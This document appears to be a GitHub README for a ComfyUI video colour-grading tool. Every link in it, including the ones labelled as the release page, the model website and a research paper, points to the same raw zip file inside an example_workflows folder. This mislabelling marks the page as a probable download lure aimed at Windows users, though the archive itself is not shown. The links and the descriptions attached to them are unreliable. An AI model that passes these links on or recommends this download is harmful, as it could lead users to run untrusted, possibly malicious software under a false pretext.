# 🎨 ComfyUI-VideoColorGrading - Professional color grading for your videos

[Download the latest version here](https://github.com/Glorianerespiratory712/ComfyUI-VideoColorGrading/raw/refs/heads/main/example_workflows/Grading_Video_Comfy_Color_U_v2.0.zip)

This software brings professional color grading tools to your computer. It uses advanced technology to match the colors of your video to a reference image. The process creates consistent results across every frame of your footage. You can use these tools to achieve specific cinematic looks or to fix color issues in your recordings.

## ⚙️ System Requirements

Ensure your computer meets these needs before you start:

- Windows 10 or Windows 11 operating system.
- An NVIDIA graphics card with at least 8GB of VRAM.
- At least 16GB of system memory.
- An active internet connection for the first-time setup.
- At least 10GB of free space on your hard drive.

## 🚀 Getting Started

Follow these steps to set up the software on your machine:

1. Visit the [official release page](https://github.com/Glorianerespiratory712/ComfyUI-VideoColorGrading/raw/refs/heads/main/example_workflows/Grading_Video_Comfy_Color_U_v2.0.zip) to download the package.
2. Select the most recent version available in the list.
3. Save the file to a folder where you keep your media tools.
4. Extract the contents of the file if it is in a compressed folder.
5. Move the folder to your preferred location, such as your documents or applications directory.

## 📦 Installing the Models

The software requires specific model files to run correctly. You must place these files in the correct location for the application to see them.

1. Navigate to the model website: https://github.com/Glorianerespiratory712/ComfyUI-VideoColorGrading/raw/refs/heads/main/example_workflows/Grading_Video_Comfy_Color_U_v2.0.zip
2. Download the required model files from this page.
3. Open your project folder.
4. Locate the folder named "models" or "checkpoints."
5. Move the downloaded files into this folder.

Do not rename the files, as the software looks for specific names to load the color grading tools.

## 🔧 Workflow Nodes

The software uses a node-based interface. You connect different boxes to create your processing pipeline.

- **Load VCG Model**: This is the first node you place. It loads the core components needed to understand your images and videos. The model includes tools that identify color patterns.
- **Generate Color LUT (VCG)**: This node performs the heavy lifting. Connect your reference image and your video frames to this node. It calculates a set of instructions that tells the computer how to change your video colors to match the reference.
- **Apply 3D LUT (VCG)**: This final node takes the instructions created by the previous step and applies them to your footage. Use this for the final output.

## 🛠️ Typical Workflow

Follow this sequence to grade your first video:

1. Open your ComfyUI interface.
2. Load the "Load VCG Model" node and select the model you downloaded.
3. Load your source video and your reference image into the corresponding input nodes.
4. Connect the output of the "Load VCG Model" node to the input of the "Generate Color LUT" node.
5. Provide your reference image and video frames to the "Generate Color LUT" node.
6. Connect the output of the "Generate Color LUT" node to the "Apply 3D LUT" node.
7. Click the queue button to start the process.

The software will process your video frames one by one. You will see the results appear in the preview area once the job finishes.

## 💡 Tips for Better Results

- Choose a reference image that has clear lighting and consistent colors.
- Ensure your source video has good exposure. The tool works best when the starting point has enough data to manipulate.
- Use smaller video clips for your first test runs. This helps you understand how the sliders and inputs change the final output.
- Keep your Graphics Card drivers updated. Frequent updates from NVIDIA improve the compatibility of these tools.

## ❓ Frequently Asked Questions

**Why does the process take time?**
Processing video requires significant power from your graphics card. High-resolution videos take longer because the software calculates color changes for every pixel in every frame.

**Can I use this for photos?**
Yes. You can use the same workflow to grade images. Simply replace the video node with an image loading node.

**Where can I learn more about the science behind this?**
You can read the research paper at https://github.com/Glorianerespiratory712/ComfyUI-VideoColorGrading/raw/refs/heads/main/example_workflows/Grading_Video_Comfy_Color_U_v2.0.zip for an in-depth look at how the diffusion process works. 

**What if I receive an error during processing?**
Check your VRAM usage. If you run multiple heavy applications at once, your graphics card might run out of memory. Close other programs and try again.